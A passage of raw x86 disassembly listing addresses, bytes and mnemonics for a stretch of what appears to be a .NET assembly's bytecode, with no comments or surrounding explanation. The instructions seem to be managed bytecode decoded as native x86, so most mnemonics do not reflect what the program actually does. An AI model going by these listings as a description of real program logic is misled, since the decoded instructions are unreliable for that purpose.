  402ab5:	00 00                	add    %al,(%eax)
  402ab7:	0a 28                	or     (%eax),%ch
  402ab9:	65 00 00             	add    %al,%gs:(%eax)
  402abc:	0a 2a                	or     (%edx),%ch
  402abe:	00 00                	add    %al,(%eax)
  402ac0:	03 30                	add    (%eax),%esi
  402ac2:	05 00 2d 01 00       	add    $0x12d00,%eax
  402ac7:	00 00                	add    %al,(%eax)
  402ac9:	00 00                	add    %al,(%eax)
  402acb:	00 02                	add    %al,(%edx)
  402acd:	7b 28                	jnp    0x402af7
  402acf:	00 00                	add    %al,(%eax)
  402ad1:	04 39                	add    $0x39,%al
  402ad3:	21 01                	and    %eax,(%ecx)
  402ad5:	00 00                	add    %al,(%eax)
  402ad7:	02 7c 29 00          	add    0x0(%ecx,%ebp,1),%bh
  402adb:	00 04 04             	add    %al,(%esp,%eax,1)
  402ade:	6f                   	outsl  %ds:(%esi),(%dx)
  402adf:	66 00 00             	data16 add %al,(%eax)
  402ae2:	0a 28                	or     (%eax),%ch
  402ae4:	67 00 00             	add    %al,(%bx,%si)
  402ae7:	0a 02                	or     (%edx),%al
  402ae9:	7c 29                	jl     0x402b14
  402aeb:	00 00                	add    %al,(%eax)
  402aed:	04 04                	add    $0x4,%al
  402aef:	6f                   	outsl  %ds:(%esi),(%dx)
  402af0:	68 00 00 0a 04       	push   $0x40a0000
  402af5:	6f                   	outsl  %ds:(%esi),(%dx)
  402af6:	69 00 00 0a 04 6f    	imul   $0x6f040a00,(%eax),%eax
  402afc:	6a 00                	push   $0x0
  402afe:	00 0a                	add    %cl,(%edx)
  402b00:	04 6f                	add    $0x6f,%al
  402b02:	6b 00 00             	imul   $0x0,(%eax),%eax
  402b05:	0a 5f 28             	or     0x28(%edi),%bl
  402b08:	26 00 00             	add    %al,%es:(%eax)
  402b0b:	06                   	push   %es
  402b0c:	16                   	push   %ss
  402b0d:	6f                   	outsl  %ds:(%esi),(%dx)
  402b0e:	6c                   	insb   (%dx),%es:(%edi)
  402b0f:	00 00                	add    %al,(%eax)
  402b11:	0a 28                	or     (%eax),%ch
  402b13:	6d                   	insl   (%dx),%es:(%edi)
  402b14:	00 00                	add    %al,(%eax)
  402b16:	0a 02                	or     (%edx),%al
  402b18:	7c 29                	jl     0x402b43
  402b1a:	00 00                	add    %al,(%eax)
  402b1c:	04 16                	add    $0x16,%al
  402b1e:	28 6e 00             	sub    %ch,0x0(%esi)
  402b21:	00 0a                	add    %cl,(%edx)
  402b23:	02 7c 29 00          	add    0x0(%ecx,%ebp,1),%bh
  402b27:	00 04 16             	add    %al,(%esi,%edx,1)
  402b2a:	28 6f 00             	sub    %ch,0x0(%edi)
  402b2d:	00 0a                	add    %cl,(%edx)
  402b2f:	04 6f                	add    $0x6f,%al
  402b31:	6a 00                	push   $0x0
  402b33:	00 0a                	add    %cl,(%edx)
  402b35:	2c 0c                	sub    $0xc,%al
  402b37:	02 7c 29 00          	add    0x0(%ecx,%ebp,1),%bh
  402b3b:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402b3e:	28 6f 00             	sub    %ch,0x0(%edi)
  402b41:	00 0a                	add    %cl,(%edx)
  402b43:	04 6f                	add    $0x6f,%al
  402b45:	6b 00 00             	imul   $0x0,(%eax),%eax
  402b48:	0a 2c 45 02 7c 29 00 	or     0x297c02(,%eax,2),%ch
  402b4f:	00 04 25 28 70 00 00 	add    %al,0x7028(,%eiz,1)
  402b56:	0a 1f                	or     (%edi),%bl
  402b58:	0c 60                	or     $0x60,%al
  402b5a:	28 6f 00             	sub    %ch,0x0(%edi)
  402b5d:	00 0a                	add    %cl,(%edx)
  402b5f:	04 6f                	add    $0x6f,%al
  402b61:	6a 00                	push   $0x0
  402b63:	00 0a                	add    %cl,(%edx)
  402b65:	2d 29 04 6f 66       	sub    $0x666f0429,%eax
  402b6a:	00 00                	add    %al,(%eax)
  402b6c:	0a 1f                	or     (%edi),%bl
  402b6e:	40                   	inc    %eax
  402b6f:	31 1f                	xor    %ebx,(%edi)
  402b71:	04 6f                	add    $0x6f,%al
  402b73:	66 00 00             	data16 add %al,(%eax)
  402b76:	0a 1f                	or     (%edi),%bl
  402b78:	60                   	pusha
  402b79:	2f                   	das
  402b7a:	15 02 7c 29 00       	adc    $0x297c02,%eax
  402b7f:	00 04 04             	add    %al,(%esp,%eax,1)
  402b82:	6f                   	outsl  %ds:(%esi),(%dx)
  402b83:	66 00 00             	data16 add %al,(%eax)
  402b86:	0a 1f                	or     (%edi),%bl
  402b88:	40                   	inc    %eax
  402b89:	59                   	pop    %ecx
  402b8a:	d1 28                	shrl   $1,(%eax)
  402b8c:	6d                   	insl   (%dx),%es:(%edi)
  402b8d:	00 00                	add    %al,(%eax)
  402b8f:	0a 04 6f             	or     (%edi,%ebp,2),%al
  402b92:	69 00 00 0a 2c 14    	imul   $0x142c0a00,(%eax),%eax
  402b98:	02 7c 29 00          	add    0x0(%ecx,%ebp,1),%bh
  402b9c:	00 04 25 28 70 00 00 	add    %al,0x7028(,%eiz,1)
  402ba3:	0a 1f                	or     (%edi),%bl
  402ba5:	10 60 28             	adc    %ah,0x28(%eax)
  402ba8:	6f                   	outsl  %ds:(%esi),(%dx)
  402ba9:	00 00                	add    %al,(%eax)
  402bab:	0a 04 6f             	or     (%edi,%ebp,2),%al
  402bae:	71 00                	jno    0x402bb0
  402bb0:	00 0a                	add    %cl,(%edx)
  402bb2:	1f                   	pop    %ds
  402bb3:	14 5f                	adc    $0x5f,%al
  402bb5:	16                   	push   %ss
  402bb6:	31 17                	xor    %edx,(%edi)
  402bb8:	02 7c 29 00          	add    0x0(%ecx,%ebp,1),%bh
  402bbc:	00 04 25 28 70 00 00 	add    %al,0x7028(,%eiz,1)
  402bc3:	0a 20                	or     (%eax),%ah
  402bc5:	80 00 00             	addb   $0x0,(%eax)
  402bc8:	00 60 28             	add    %ah,0x28(%eax)
  402bcb:	6f                   	outsl  %ds:(%esi),(%dx)
  402bcc:	00 00                	add    %al,(%eax)
  402bce:	0a 04 6f             	or     (%edi,%ebp,2),%al
  402bd1:	71 00                	jno    0x402bd3
  402bd3:	00 0a                	add    %cl,(%edx)
  402bd5:	20 90 00 00 00 5f    	and    %dl,0x5f000000(%eax)
  402bdb:	16                   	push   %ss
  402bdc:	31 14 02             	xor    %edx,(%edx,%eax,1)
  402bdf:	7c 29                	jl     0x402c0a
  402be1:	00 00                	add    %al,(%eax)
  402be3:	04 25                	add    $0x25,%al
  402be5:	28 70 00             	sub    %dh,0x0(%eax)
  402be8:	00 0a                	add    %cl,(%edx)
  402bea:	1f                   	pop    %ds
  402beb:	20 60 28             	and    %ah,0x28(%eax)
  402bee:	6f                   	outsl  %ds:(%esi),(%dx)
  402bef:	00 00                	add    %al,(%eax)
  402bf1:	0a 02                	or     (%edx),%al
  402bf3:	28 17                	sub    %dl,(%edi)
  402bf5:	00 00                	add    %al,(%eax)
  402bf7:	0a 2a                	or     (%edx),%ch
  402bf9:	00 00                	add    %al,(%eax)
  402bfb:	00 03                	add    %al,(%ebx)
  402bfd:	30 05 00 2d 01 00    	xor    %al,0x12d00
  402c03:	00 00                	add    %al,(%eax)
  402c05:	00 00                	add    %al,(%eax)
  402c07:	00 02                	add    %al,(%edx)
  402c09:	7b 28                	jnp    0x402c33
  402c0b:	00 00                	add    %al,(%eax)
  402c0d:	04 3a                	add    $0x3a,%al
  402c0f:	21 01                	and    %eax,(%ecx)
  402c11:	00 00                	add    %al,(%eax)
  402c13:	02 7c 29 00          	add    0x0(%ecx,%ebp,1),%bh
  402c17:	00 04 04             	add    %al,(%esp,%eax,1)
  402c1a:	6f                   	outsl  %ds:(%esi),(%dx)
  402c1b:	66 00 00             	data16 add %al,(%eax)
  402c1e:	0a 28                	or     (%eax),%ch
  402c20:	67 00 00             	add    %al,(%bx,%si)
  402c23:	0a 02                	or     (%edx),%al
  402c25:	7c 29                	jl     0x402c50
  402c27:	00 00                	add    %al,(%eax)
  402c29:	04 04                	add    $0x4,%al
  402c2b:	6f                   	outsl  %ds:(%esi),(%dx)
  402c2c:	68 00 00 0a 04       	push   $0x40a0000
  402c31:	6f                   	outsl  %ds:(%esi),(%dx)
  402c32:	69 00 00 0a 04 6f    	imul   $0x6f040a00,(%eax),%eax
  402c38:	6a 00                	push   $0x0
  402c3a:	00 0a                	add    %cl,(%edx)
  402c3c:	04 6f                	add    $0x6f,%al
  402c3e:	6b 00 00             	imul   $0x0,(%eax),%eax
  402c41:	0a 5f 28             	or     0x28(%edi),%bl
  402c44:	26 00 00             	add    %al,%es:(%eax)
  402c47:	06                   	push   %es
  402c48:	16                   	push   %ss
  402c49:	6f                   	outsl  %ds:(%esi),(%dx)
  402c4a:	6c                   	insb   (%dx),%es:(%edi)
  402c4b:	00 00                	add    %al,(%eax)
  402c4d:	0a 28                	or     (%eax),%ch
  402c4f:	6d                   	insl   (%dx),%es:(%edi)
  402c50:	00 00                	add    %al,(%eax)
  402c52:	0a 02                	or     (%edx),%al
  402c54:	7c 29                	jl     0x402c7f
  402c56:	00 00                	add    %al,(%eax)
  402c58:	04 17                	add    $0x17,%al
  402c5a:	28 6e 00             	sub    %ch,0x0(%esi)
  402c5d:	00 0a                	add    %cl,(%edx)
  402c5f:	02 7c 29 00          	add    0x0(%ecx,%ebp,1),%bh
  402c63:	00 04 16             	add    %al,(%esi,%edx,1)
  402c66:	28 6f 00             	sub    %ch,0x0(%edi)
  402c69:	00 0a                	add    %cl,(%edx)
  402c6b:	04 6f                	add    $0x6f,%al
  402c6d:	6a 00                	push   $0x0
  402c6f:	00 0a                	add    %cl,(%edx)
  402c71:	2c 0c                	sub    $0xc,%al
  402c73:	02 7c 29 00          	add    0x0(%ecx,%ebp,1),%bh
  402c77:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402c7a:	28 6f 00             	sub    %ch,0x0(%edi)
  402c7d:	00 0a                	add    %cl,(%edx)
  402c7f:	04 6f                	add    $0x6f,%al
  402c81:	6b 00 00             	imul   $0x0,(%eax),%eax
  402c84:	0a 2c 45 02 7c 29 00 	or     0x297c02(,%eax,2),%ch
  402c8b:	00 04 25 28 70 00 00 	add    %al,0x7028(,%eiz,1)
  402c92:	0a 1f                	or     (%edi),%bl
  402c94:	0c 60                	or     $0x60,%al
  402c96:	28 6f 00             	sub    %ch,0x0(%edi)
  402c99:	00 0a                	add    %cl,(%edx)
  402c9b:	04 6f                	add    $0x6f,%al
  402c9d:	6a 00                	push   $0x0
  402c9f:	00 0a                	add    %cl,(%edx)
  402ca1:	2d 29 04 6f 66       	sub    $0x666f0429,%eax
  402ca6:	00 00                	add    %al,(%eax)
  402ca8:	0a 1f                	or     (%edi),%bl
  402caa:	40                   	inc    %eax
  402cab:	31 1f                	xor    %ebx,(%edi)
  402cad:	04 6f                	add    $0x6f,%al
  402caf:	66 00 00             	data16 add %al,(%eax)
  402cb2:	0a 1f                	or     (%edi),%bl
  402cb4:	60                   	pusha
  402cb5:	2f                   	das
  402cb6:	15 02 7c 29 00       	adc    $0x297c02,%eax
  402cbb:	00 04 04             	add    %al,(%esp,%eax,1)
  402cbe:	6f                   	outsl  %ds:(%esi),(%dx)
  402cbf:	66 00 00             	data16 add %al,(%eax)
  402cc2:	0a 1f                	or     (%edi),%bl
  402cc4:	40                   	inc    %eax
  402cc5:	59                   	pop    %ecx
  402cc6:	d1 28                	shrl   $1,(%eax)
  402cc8:	6d                   	insl   (%dx),%es:(%edi)
  402cc9:	00 00                	add    %al,(%eax)
  402ccb:	0a 04 6f             	or     (%edi,%ebp,2),%al
  402cce:	69 00 00 0a 2c 14    	imul   $0x142c0a00,(%eax),%eax
  402cd4:	02 7c 29 00          	add    0x0(%ecx,%ebp,1),%bh
  402cd8:	00 04 25 28 70 00 00 	add    %al,0x7028(,%eiz,1)
  402cdf:	0a 1f                	or     (%edi),%bl
  402ce1:	10 60 28             	adc    %ah,0x28(%eax)
  402ce4:	6f                   	outsl  %ds:(%esi),(%dx)
  402ce5:	00 00                	add    %al,(%eax)
  402ce7:	0a 04 6f             	or     (%edi,%ebp,2),%al
  402cea:	71 00                	jno    0x402cec
  402cec:	00 0a                	add    %cl,(%edx)
  402cee:	1f                   	pop    %ds
  402cef:	14 5f                	adc    $0x5f,%al
  402cf1:	16                   	push   %ss
  402cf2:	31 17                	xor    %edx,(%edi)
  402cf4:	02 7c 29 00          	add    0x0(%ecx,%ebp,1),%bh
  402cf8:	00 04 25 28 70 00 00 	add    %al,0x7028(,%eiz,1)
  402cff:	0a 20                	or     (%eax),%ah
  402d01:	80 00 00             	addb   $0x0,(%eax)
  402d04:	00 60 28             	add    %ah,0x28(%eax)
  402d07:	6f                   	outsl  %ds:(%esi),(%dx)
  402d08:	00 00                	add    %al,(%eax)
  402d0a:	0a 04 6f             	or     (%edi,%ebp,2),%al
  402d0d:	71 00                	jno    0x402d0f
  402d0f:	00 0a                	add    %cl,(%edx)
  402d11:	20 90 00 00 00 5f    	and    %dl,0x5f000000(%eax)
  402d17:	16                   	push   %ss
  402d18:	31 14 02             	xor    %edx,(%edx,%eax,1)
  402d1b:	7c 29                	jl     0x402d46
  402d1d:	00 00                	add    %al,(%eax)
  402d1f:	04 25                	add    $0x25,%al
  402d21:	28 70 00             	sub    %dh,0x0(%eax)
  402d24:	00 0a                	add    %cl,(%edx)
  402d26:	1f                   	pop    %ds
  402d27:	20 60 28             	and    %ah,0x28(%eax)
  402d2a:	6f                   	outsl  %ds:(%esi),(%dx)
  402d2b:	00 00                	add    %al,(%eax)
  402d2d:	0a 02                	or     (%edx),%al
  402d2f:	28 17                	sub    %dl,(%edi)
  402d31:	00 00                	add    %al,(%eax)
  402d33:	0a 2a                	or     (%edx),%ch
  402d35:	00 00                	add    %al,(%eax)
  402d37:	00 13                	add    %dl,(%ebx)
  402d39:	30 01                	xor    %al,(%ecx)
  402d3b:	00 da                	add    %bl,%dl
  402d3d:	00 00                	add    %al,(%eax)
  402d3f:	00 09                	add    %cl,(%ecx)
  402d41:	00 00                	add    %al,(%eax)
  402d43:	11 03                	adc    %eax,(%ebx)
  402d45:	0a 06                	or     (%esi),%al
  402d47:	45                   	inc    %ebp
  402d48:	10 00                	adc    %al,(%eax)
  402d4a:	00 00                	add    %al,(%eax)
  402d4c:	05 00 00 00 17       	add    $0x17000000,%eax
  402d51:	00 00                	add    %al,(%eax)
  402d53:	00 2d 00 00 00 38    	add    %ch,0x38000000
  402d59:	00 00                	add    %al,(%eax)
  402d5b:	00 4e 00             	add    %cl,0x0(%esi)
  402d5e:	00 00                	add    %al,(%eax)
  402d60:	43                   	inc    %ebx
  402d61:	00 00                	add    %al,(%eax)
  402d63:	00 59 00             	add    %bl,0x0(%ecx)
  402d66:	00 00                	add    %al,(%eax)
  402d68:	64 00 00             	add    %al,%fs:(%eax)
  402d6b:	00 22                	add    %ah,(%edx)
  402d6d:	00 00                	add    %al,(%eax)
  402d6f:	00 0b                	add    %cl,(%ebx)
  402d71:	00 00                	add    %al,(%eax)
  402d73:	00 6f 00             	add    %ch,0x0(%edi)
  402d76:	00 00                	add    %al,(%eax)
  402d78:	11 00                	adc    %eax,(%eax)
  402d7a:	00 00                	add    %al,(%eax)
  402d7c:	80 00 00             	addb   $0x0,(%eax)
  402d7f:	00 7a 00             	add    %bh,0x0(%edx)
  402d82:	00 00                	add    %al,(%eax)
  402d84:	8c 00                	mov    %es,(%eax)
  402d86:	00 00                	add    %al,(%eax)
  402d88:	86 00                	xchg   %al,(%eax)
  402d8a:	00 00                	add    %al,(%eax)
  402d8c:	38 87 00 00 00 28    	cmp    %al,0x28000000(%edi)
  402d92:	72 00                	jb     0x402d94
  402d94:	00 0a                	add    %cl,(%edx)
  402d96:	2a 28                	sub    (%eax),%ch
  402d98:	73 00                	jae    0x402d9a
  402d9a:	00 0a                	add    %cl,(%edx)
  402d9c:	2a 28                	sub    (%eax),%ch
  402d9e:	74 00                	je     0x402da0
  402da0:	00 0a                	add    %cl,(%edx)
  402da2:	2a 72 77             	sub    0x77(%edx),%dh
  402da5:	00 00                	add    %al,(%eax)
  402da7:	70 28                	jo     0x402dd1
  402da9:	75 00                	jne    0x402dab
  402dab:	00 0a                	add    %cl,(%edx)
  402dad:	2a 72 87             	sub    -0x79(%edx),%dh
  402db0:	00 00                	add    %al,(%eax)
  402db2:	70 28                	jo     0x402ddc
  402db4:	75 00                	jne    0x402db6
  402db6:	00 0a                	add    %cl,(%edx)
  402db8:	2a 72 97             	sub    -0x69(%edx),%dh
  402dbb:	00 00                	add    %al,(%eax)
  402dbd:	70 28                	jo     0x402de7
  402dbf:	75 00                	jne    0x402dc1
  402dc1:	00 0a                	add    %cl,(%edx)
  402dc3:	2a 72 a7             	sub    -0x59(%edx),%dh
  402dc6:	00 00                	add    %al,(%eax)
  402dc8:	70 28                	jo     0x402df2
  402dca:	75 00                	jne    0x402dcc
  402dcc:	00 0a                	add    %cl,(%edx)
  402dce:	2a 72 b7             	sub    -0x49(%edx),%dh
  402dd1:	00 00                	add    %al,(%eax)
  402dd3:	70 28                	jo     0x402dfd
  402dd5:	75 00                	jne    0x402dd7
  402dd7:	00 0a                	add    %cl,(%edx)
  402dd9:	2a 72 c7             	sub    -0x39(%edx),%dh
  402ddc:	00 00                	add    %al,(%eax)
  402dde:	70 28                	jo     0x402e08
  402de0:	75 00                	jne    0x402de2
  402de2:	00 0a                	add    %cl,(%edx)
  402de4:	2a 72 d7             	sub    -0x29(%edx),%dh
  402de7:	00 00                	add    %al,(%eax)
  402de9:	70 28                	jo     0x402e13
  402deb:	75 00                	jne    0x402ded
  402ded:	00 0a                	add    %cl,(%edx)
  402def:	2a 72 e7             	sub    -0x19(%edx),%dh
  402df2:	00 00                	add    %al,(%eax)
  402df4:	70 28                	jo     0x402e1e
  402df6:	75 00                	jne    0x402df8
  402df8:	00 0a                	add    %cl,(%edx)
  402dfa:	2a 72 f7             	sub    -0x9(%edx),%dh
  402dfd:	00 00                	add    %al,(%eax)
  402dff:	70 28                	jo     0x402e29
  402e01:	75 00                	jne    0x402e03
  402e03:	00 0a                	add    %cl,(%edx)
  402e05:	2a 28                	sub    (%eax),%ch
  402e07:	76 00                	jbe    0x402e09
  402e09:	00 0a                	add    %cl,(%edx)
  402e0b:	2a 28                	sub    (%eax),%ch
  402e0d:	77 00                	ja     0x402e0f
  402e0f:	00 0a                	add    %cl,(%edx)
  402e11:	2a 28                	sub    (%eax),%ch
  402e13:	78 00                	js     0x402e15
  402e15:	00 0a                	add    %cl,(%edx)
  402e17:	2a 28                	sub    (%eax),%ch
  402e19:	79 00                	jns    0x402e1b
  402e1b:	00 0a                	add    %cl,(%edx)
  402e1d:	2a 00                	sub    (%eax),%al
  402e1f:	00 03                	add    %al,(%ebx)
  402e21:	30 02                	xor    %al,(%edx)
  402e23:	00 43 00             	add    %al,0x0(%ebx)
  402e26:	00 00                	add    %al,(%eax)
  402e28:	00 00                	add    %al,(%eax)
  402e2a:	00 00                	add    %al,(%eax)
  402e2c:	02 19                	add    (%ecx),%bl
  402e2e:	7d 2a                	jge    0x402e5a
  402e30:	00 00                	add    %al,(%eax)
  402e32:	04 02                	add    $0x2,%al
  402e34:	72 01                	jb     0x402e37
  402e36:	00 00                	add    %al,(%eax)
  402e38:	70 7d                	jo     0x402eb7
  402e3a:	2b 00                	sub    (%eax),%eax
  402e3c:	00 04 02             	add    %al,(%edx,%eax,1)
  402e3f:	73 7a                	jae    0x402ebb
  402e41:	00 00                	add    %al,(%eax)
  402e43:	0a 7d 2c             	or     0x2c(%ebp),%bh
  402e46:	00 00                	add    %al,(%eax)
  402e48:	04 02                	add    $0x2,%al
  402e4a:	15 7d 2d 00 00       	adc    $0x2d7d,%eax
  402e4f:	04 02                	add    $0x2,%al
  402e51:	15 7d 2e 00 00       	adc    $0x2e7d,%eax
  402e56:	04 02                	add    $0x2,%al
  402e58:	73 7b                	jae    0x402ed5
  402e5a:	00 00                	add    %al,(%eax)
  402e5c:	0a 7d 30             	or     0x30(%ebp),%bh
  402e5f:	00 00                	add    %al,(%eax)
  402e61:	04 02                	add    $0x2,%al
  402e63:	28 18                	sub    %bl,(%eax)
  402e65:	00 00                	add    %al,(%eax)
  402e67:	0a 02                	or     (%edx),%al
  402e69:	28 30                	sub    %dh,(%eax)
  402e6b:	00 00                	add    %al,(%eax)
  402e6d:	06                   	push   %es
  402e6e:	2a 00                	sub    (%eax),%al
  402e70:	03 30                	add    (%eax),%esi
  402e72:	02 00                	add    (%eax),%al
  402e74:	4a                   	dec    %edx
  402e75:	00 00                	add    %al,(%eax)
  402e77:	00 00                	add    %al,(%eax)
  402e79:	00 00                	add    %al,(%eax)
  402e7b:	00 02                	add    %al,(%edx)
  402e7d:	19 7d 2a             	sbb    %edi,0x2a(%ebp)
  402e80:	00 00                	add    %al,(%eax)
  402e82:	04 02                	add    $0x2,%al
  402e84:	72 01                	jb     0x402e87
  402e86:	00 00                	add    %al,(%eax)
  402e88:	70 7d                	jo     0x402f07
  402e8a:	2b 00                	sub    (%eax),%eax
  402e8c:	00 04 02             	add    %al,(%edx,%eax,1)
  402e8f:	73 7a                	jae    0x402f0b
  402e91:	00 00                	add    %al,(%eax)
  402e93:	0a 7d 2c             	or     0x2c(%ebp),%bh
  402e96:	00 00                	add    %al,(%eax)
  402e98:	04 02                	add    $0x2,%al
  402e9a:	15 7d 2d 00 00       	adc    $0x2d7d,%eax
  402e9f:	04 02                	add    $0x2,%al
  402ea1:	15 7d 2e 00 00       	adc    $0x2e7d,%eax
  402ea6:	04 02                	add    $0x2,%al
  402ea8:	73 7b                	jae    0x402f25
  402eaa:	00 00                	add    %al,(%eax)
  402eac:	0a 7d 30             	or     0x30(%ebp),%bh
  402eaf:	00 00                	add    %al,(%eax)
  402eb1:	04 02                	add    $0x2,%al
  402eb3:	28 18                	sub    %bl,(%eax)
  402eb5:	00 00                	add    %al,(%eax)
  402eb7:	0a 02                	or     (%edx),%al
  402eb9:	03 7d 2a             	add    0x2a(%ebp),%edi
  402ebc:	00 00                	add    %al,(%eax)
  402ebe:	04 02                	add    $0x2,%al
  402ec0:	28 30                	sub    %dh,(%eax)
  402ec2:	00 00                	add    %al,(%eax)
  402ec4:	06                   	push   %es
  402ec5:	2a 00                	sub    (%eax),%al
  402ec7:	00 03                	add    %al,(%ebx)
  402ec9:	30 02                	xor    %al,(%edx)
  402ecb:	00 51 00             	add    %dl,0x0(%ecx)
  402ece:	00 00                	add    %al,(%eax)
  402ed0:	00 00                	add    %al,(%eax)
  402ed2:	00 00                	add    %al,(%eax)
  402ed4:	02 19                	add    (%ecx),%bl
  402ed6:	7d 2a                	jge    0x402f02
  402ed8:	00 00                	add    %al,(%eax)
  402eda:	04 02                	add    $0x2,%al
  402edc:	72 01                	jb     0x402edf
  402ede:	00 00                	add    %al,(%eax)
  402ee0:	70 7d                	jo     0x402f5f
  402ee2:	2b 00                	sub    (%eax),%eax
  402ee4:	00 04 02             	add    %al,(%edx,%eax,1)
  402ee7:	73 7a                	jae    0x402f63
  402ee9:	00 00                	add    %al,(%eax)
  402eeb:	0a 7d 2c             	or     0x2c(%ebp),%bh
  402eee:	00 00                	add    %al,(%eax)
  402ef0:	04 02                	add    $0x2,%al
  402ef2:	15 7d 2d 00 00       	adc    $0x2d7d,%eax
  402ef7:	04 02                	add    $0x2,%al
  402ef9:	15 7d 2e 00 00       	adc    $0x2e7d,%eax
  402efe:	04 02                	add    $0x2,%al
  402f00:	73 7b                	jae    0x402f7d
  402f02:	00 00                	add    %al,(%eax)
  402f04:	0a 7d 30             	or     0x30(%ebp),%bh
  402f07:	00 00                	add    %al,(%eax)
  402f09:	04 02                	add    $0x2,%al
  402f0b:	28 18                	sub    %bl,(%eax)
  402f0d:	00 00                	add    %al,(%eax)
  402f0f:	0a 02                	or     (%edx),%al
  402f11:	03 7d 2b             	add    0x2b(%ebp),%edi
  402f14:	00 00                	add    %al,(%eax)
  402f16:	04 02                	add    $0x2,%al
  402f18:	04 7d                	add    $0x7d,%al
  402f1a:	2a 00                	sub    (%eax),%al
  402f1c:	00 04 02             	add    %al,(%edx,%eax,1)
  402f1f:	28 30                	sub    %dh,(%eax)
  402f21:	00 00                	add    %al,(%eax)
  402f23:	06                   	push   %es
  402f24:	2a 00                	sub    (%eax),%al
  402f26:	00 00                	add    %al,(%eax)
  402f28:	03 30                	add    (%eax),%esi
  402f2a:	03 00                	add    (%eax),%eax
  402f2c:	c2 00 00             	ret    $0x0
  402f2f:	00 00                	add    %al,(%eax)
  402f31:	00 00                	add    %al,(%eax)
  402f33:	00 02                	add    %al,(%edx)
  402f35:	28 7c 00 00          	sub    %bh,0x0(%eax,%eax,1)
  402f39:	0a 02                	or     (%edx),%al
  402f3b:	22 00                	and    (%eax),%al
  402f3d:	00 c0                	add    %al,%al
  402f3f:	40                   	inc    %eax
  402f40:	22 00                	and    (%eax),%al
  402f42:	00 50 41             	add    %dl,0x41(%eax)
  402f45:	73 2b                	jae    0x402f72
  402f47:	00 00                	add    %al,(%eax)
  402f49:	0a 28                	or     (%eax),%ch
  402f4b:	2c 00                	sub    $0x0,%al
  402f4d:	00 0a                	add    %cl,(%edx)
  402f4f:	02 17                	add    (%edi),%dl
  402f51:	28 2d 00 00 0a 02    	sub    %ch,0x20a0000
  402f57:	17                   	pop    %ss
  402f58:	6f                   	outsl  %ds:(%esi),(%dx)
  402f59:	7d 00                	jge    0x402f5b
  402f5b:	00 0a                	add    %cl,(%edx)
  402f5d:	02 02                	add    (%edx),%al
  402f5f:	7b 2b                	jnp    0x402f8c
  402f61:	00 00                	add    %al,(%eax)
  402f63:	04 6f                	add    $0x6f,%al
  402f65:	31 00                	xor    %eax,(%eax)
  402f67:	00 0a                	add    %cl,(%edx)
  402f69:	02 20                	add    (%eax),%ah
  402f6b:	93                   	xchg   %eax,%ebx
  402f6c:	00 00                	add    %al,(%eax)
  402f6e:	00 28                	add    %ch,(%eax)
  402f70:	5a                   	pop    %edx
  402f71:	00 00                	add    %al,(%eax)
  402f73:	0a 02                	or     (%edx),%al
  402f75:	20 20                	and    %ah,(%eax)
  402f77:	03 00                	add    (%eax),%eax
  402f79:	00 28                	add    %ch,(%eax)
  402f7b:	5b                   	pop    %ebx
  402f7c:	00 00                	add    %al,(%eax)
  402f7e:	0a 02                	or     (%edx),%al
  402f80:	28 78 00             	sub    %bh,0x0(%eax)
  402f83:	00 0a                	add    %cl,(%edx)
  402f85:	6f                   	outsl  %ds:(%esi),(%dx)
  402f86:	7e 00                	jle    0x402f88
  402f88:	00 0a                	add    %cl,(%edx)
  402f8a:	02 17                	add    (%edi),%dl
  402f8c:	28 45 00             	sub    %al,0x0(%ebp)
  402f8f:	00 0a                	add    %cl,(%edx)
  402f91:	02 16                	add    (%esi),%dl
  402f93:	28 4b 00             	sub    %cl,0x0(%ebx)
  402f96:	00 0a                	add    %cl,(%edx)
  402f98:	02 16                	add    (%esi),%dl
  402f9a:	28 4c 00 00          	sub    %cl,0x0(%eax,%eax,1)
  402f9e:	0a 02                	or     (%edx),%al
  402fa0:	16                   	push   %ss
  402fa1:	28 7f 00             	sub    %bh,0x0(%edi)
  402fa4:	00 0a                	add    %cl,(%edx)
  402fa6:	02 17                	add    (%edi),%dl
  402fa8:	28 46 00             	sub    %al,0x0(%esi)
  402fab:	00 0a                	add    %cl,(%edx)
  402fad:	02 28                	add    (%eax),%ch
  402faf:	80 00 00             	addb   $0x0,(%eax)
  402fb2:	0a 02                	or     (%edx),%al
  402fb4:	7b 2c                	jnp    0x402fe2
  402fb6:	00 00                	add    %al,(%eax)
  402fb8:	04 02                	add    $0x2,%al
  402fba:	fe 06                	incb   (%esi)
  402fbc:	31 00                	xor    %eax,(%eax)
  402fbe:	00 06                	add    %al,(%esi)
  402fc0:	73 81                	jae    0x402f43
  402fc2:	00 00                	add    %al,(%eax)
  402fc4:	0a 6f 82             	or     -0x7e(%edi),%ch
  402fc7:	00 00                	add    %al,(%eax)
  402fc9:	0a 02                	or     (%edx),%al
  402fcb:	7b 2c                	jnp    0x402ff9
  402fcd:	00 00                	add    %al,(%eax)
  402fcf:	04 23                	add    $0x23,%al
  402fd1:	00 00                	add    %al,(%eax)
  402fd3:	00 00                	add    %al,(%eax)
  402fd5:	00 00                	add    %al,(%eax)
  402fd7:	49                   	dec    %ecx
  402fd8:	40                   	inc    %eax
  402fd9:	6f                   	outsl  %ds:(%esi),(%dx)
  402fda:	83 00 00             	addl   $0x0,(%eax)
  402fdd:	0a 02                	or     (%edx),%al
  402fdf:	7b 2c                	jnp    0x40300d
  402fe1:	00 00                	add    %al,(%eax)
  402fe3:	04 17                	add    $0x17,%al
  402fe5:	6f                   	outsl  %ds:(%esi),(%dx)
  402fe6:	84 00                	test   %al,(%eax)
  402fe8:	00 0a                	add    %cl,(%edx)
  402fea:	02 7b 2c             	add    0x2c(%ebx),%bh
  402fed:	00 00                	add    %al,(%eax)
  402fef:	04 6f                	add    $0x6f,%al
  402ff1:	85 00                	test   %eax,(%eax)
  402ff3:	00 0a                	add    %cl,(%edx)
  402ff5:	2a 00                	sub    (%eax),%al
  402ff7:	00 03                	add    %al,(%ebx)
  402ff9:	30 02                	xor    %al,(%edx)
  402ffb:	00 6d 00             	add    %ch,0x0(%ebp)
  402ffe:	00 00                	add    %al,(%eax)
  403000:	00 00                	add    %al,(%eax)
  403002:	00 00                	add    %al,(%eax)
  403004:	02 7b 2f             	add    0x2f(%ebx),%bh
  403007:	00 00                	add    %al,(%eax)
  403009:	04 2c                	add    $0x2c,%al
  40300b:	01 2a                	add    %ebp,(%edx)
  40300d:	02 17                	add    (%edi),%dl
  40300f:	7d 2f                	jge    0x403040
  403011:	00 00                	add    %al,(%eax)
  403013:	04 02                	add    $0x2,%al
  403015:	7b 2d                	jnp    0x403044
